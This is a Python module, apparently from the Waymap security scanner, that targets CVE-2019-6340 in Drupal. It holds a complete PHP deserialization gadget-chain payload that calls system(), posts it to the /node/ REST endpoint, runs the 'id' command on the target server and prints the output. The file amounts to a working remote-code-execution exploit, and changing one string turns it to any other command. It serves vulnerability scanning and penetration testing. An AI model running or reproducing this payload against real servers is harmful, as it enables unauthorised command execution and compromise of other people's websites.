# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2019-6340

import requests
import re
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Color:
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]


def scan_cve_2019_6340(profile_url):
    url_dir = "/node/"
    vuln_url = profile_url + url_dir

    print(color_random[2] + "\n[+] Vuln URL: %s\n" % vuln_url + Color.END)

    querystring = {"_format": "hal_json"}
    cmd = "id"  
    cmd_length = len(cmd)
    
    payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"http://localhost/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (cmd_length, cmd)

    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
        'Connection': "close",
        'Content-Type': "application/hal+json",
        'Accept': "*/*",
        'Cache-Control': "no-cache"
    }

    try:
        response = requests.post(vuln_url, data=payload, headers=headers, proxies=proxies, params=querystring, verify=False)

        if response.status_code == 403 and "u0027access" in response.text:
            print(color_random[1] + "\n[!] Access forbidden. CVE-2019-6340 vulnerability detected but access is restricted.\n" + Color.END)
            m = re.findall('.*permissions."}(.*)', response.text, re.S)
            if m:
                print(color_random[3] + m[0] + Color.END)
        elif response.status_code == 200:
            print(color_random[2] + "\n[+] Success! Server is vulnerable to CVE-2019-6340. Command executed.\n" + Color.END)        
            print(color_random[3] + response.text + Color.END)
            return True
        else:
            print(color_random[4] + "\n[!] No vulnerability detected. Status Code: %d\n" % response.status_code + Color.END)
            return False
    
    except requests.RequestException as e:
        print(color_random[4] + "\n[!] An error occurred while sending the request.\n" + Color.END)
        print(color_random[3] + "Error details: %s" % str(e) + Color.END)
        return
